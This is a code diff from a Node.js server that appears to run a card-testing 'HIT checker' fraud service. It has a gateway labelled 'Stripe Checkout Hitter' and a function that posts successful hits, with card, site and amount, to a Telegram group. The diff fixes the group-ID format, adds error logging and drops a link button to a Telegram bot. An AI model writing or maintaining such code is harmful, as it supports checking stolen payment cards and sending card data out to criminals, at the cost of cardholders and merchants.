@@ -373,7 +373,13 @@ app.post('/verify-membership', async (req, res) => {
 // Telegram Notification Helper (Server-side)
 async function sendHitNotification(res, gate, userPlan, userName, site, amount, card) {
     const NOTIFY_BOT_TOKEN = config.NOTIFY_BOT_TOKEN;
-    const NOTIFY_CHAT_ID = config.NOTIFY_CHAT_ID;
+    let NOTIFY_CHAT_ID = config.NOTIFY_CHAT_ID;
+
+    // Auto-fix Group ID if it's a 10-digit number missing the prefix
+    if (NOTIFY_CHAT_ID && /^\d{10}$/.test(NOTIFY_CHAT_ID)) {
+        NOTIFY_CHAT_ID = `-100${NOTIFY_CHAT_ID}`;
+        console.log(`[Notification] Auto-fixed Group ID to ${NOTIFY_CHAT_ID}`);
+    }
 
     const gatewayMap = {
         'checkout': 'Stripe Checkout Hitter',
@@ -394,18 +400,20 @@ async function sendHitNotification(res, gate, userPlan, userName, site, amount, 
 `.trim();
 
     try {
-        await axios.post(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
+        console.log(`[Notification] Sending to ${NOTIFY_CHAT_ID}...`);
+        const response = await axios.post(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
             chat_id: NOTIFY_CHAT_ID,
             text: message,
             parse_mode: 'HTML',
-            disable_web_page_preview: true,
-            reply_markup: {
-                inline_keyboard: [[{ text: "Open HIT Checker", url: "https://t.me/autohittrobot" }]]
-            }
-        }).catch(() => {});
-        console.log(`[Notification] Success sent`);
+            disable_web_page_preview: true
+        });
+        console.log(`[Notification] Success:`, response.data.ok);
     } catch (err) {
-        console.error('[Notification] Failed:', err.message);
+        if (err.response) {
+            console.error('[Notification] Telegram API Error:', err.response.data);
+        } else {
+            console.error('[Notification] Failed:', err.message);
+        }
     }
 }
 
